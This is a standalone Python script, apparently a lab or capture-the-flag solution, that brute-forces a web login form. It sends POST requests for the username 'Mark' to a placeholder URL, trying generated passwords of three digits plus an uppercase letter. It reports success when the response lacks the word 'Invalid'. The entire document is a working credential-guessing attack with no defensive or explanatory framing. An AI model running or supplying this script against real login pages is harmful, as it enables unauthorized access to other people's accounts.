import requests  
import string


# base url for the login page
url: str = "target_url_here"  # Replace with the actual target URL


# username to bruteforce
username: str = "Mark"

# Genrate your password list it's just an example
password_list: list = [str(i).zfill(3) + letter for i in range(1000) for letter in string.ascii_uppercase]


def bruteforce():
    "function to bruteforce the password by sending post requests to the login page with the username and password combination and checking the response for success or failure"
    for password in password_list:
        data = {
            "username": username,
            "password": password
        }
        response = requests.post(url, data=data)
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempted: {password}")
    else:
        print("[-] No valid credentials found.")
    
            
            
            
try:
    bruteforce()
except requests.exceptions.RequestException as e:
    print(f"[-] Request failed: {e} \nPlease check your internet connection or the URL.")
except KeyboardInterrupt:
    print("\n[-] Bruteforce interrupted by user.")
except Exception as e:
    print(f"[-] An error occurred: {e}")
finally:
        print("Bruteforce Stopped.")    
        